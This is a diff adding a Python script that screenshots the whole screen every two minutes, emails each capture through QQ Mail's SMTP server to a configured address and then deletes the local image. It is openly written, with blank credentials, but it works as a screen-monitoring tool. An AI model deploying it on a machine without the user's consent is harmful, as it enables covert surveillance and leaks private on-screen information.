@@ -1,0 +1,85 @@
+import requests
+import smtplib
+import schedule
+import time
+from bs4 import BeautifulSoup
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+from email.header import Header
+from PIL import ImageGrab
+import os
+
+account =  ''  # 发件人
+password = ''  # QQ邮箱授权码
+receiver = ' ' # 收件人  ，发件人和收件人可相同。
+
+
+def send_email():
+    try:
+        mailhost = 'smtp.qq.com'
+        qqmail = smtplib.SMTP_SSL(host='smtp.qq.com')
+        qqmail.connect(mailhost, 465)
+        qqmail.login(account, password)
+
+        # 以html格式构建邮件内容
+        send_str = '''
+        <html>
+        <body>
+        <center>name</center>
+        <img src="cid:image1" alt="image1" align="center" width=100% >
+        <center>👻</center>
+        </body>
+        </html>
+        '''
+
+        # 构建message
+        message = MIMEMultipart()
+        # 添加邮件内容
+        content = MIMEText(send_str, _subtype='html', _charset='utf8')
+        message.attach(content)
+
+        # 构建并添加图像对象
+
+        now = time.localtime()
+        nowt = time.strftime("%Y-%m-%d-%H-%M", now)  # 图片以日期命名
+        img1 = MIMEImage(open(nowt+'.jpg', 'rb').read(), _subtype='octet-stream')
+        img1.add_header('Content-ID', 'image1')
+        message.attach(img1)
+
+        # 构建并添加附件对象
+        img = MIMEImage(open(nowt+ '.jpg', 'rb').read(), _subtype='octet-stream')
+        img.add_header('Content-Disposition', 'attachment', filename=nowt+ '.jpg')
+        message.attach(img)
+
+        now1 = time.localtime()
+        nowt2 = time.strftime("%Y-%m-%d %H:%M:%S", now1) #主题加日期
+        subject = '6#'+nowt2                             #主题可自定义
+        message['Subject'] = Header(subject)
+        
+        try:
+            qqmail.sendmail(account, receiver, message.as_string())
+            print('邮件发送成功')
+        except:
+            print('邮件发送失败')
+        qqmail.quit()
+    except Exception as result:
+        print('发送失败')
+
+
+def job():
+    # 电脑屏幕截屏
+    now = time.localtime()
+    nowt = time.strftime("%Y-%m-%d-%H-%M", now)
+    img = ImageGrab.grab()
+    img.save(nowt+ ".jpg")
+    print('开始一次任务')
+    send_email()
+    os.remove(nowt + ".jpg")     #发送完后自动删除
+    print('任务完成')
+
+
+schedule.every(2).minutes.do(job) #发送时间可自定义 
+while True:
+    schedule.run_pending()
+    time.sleep(1)
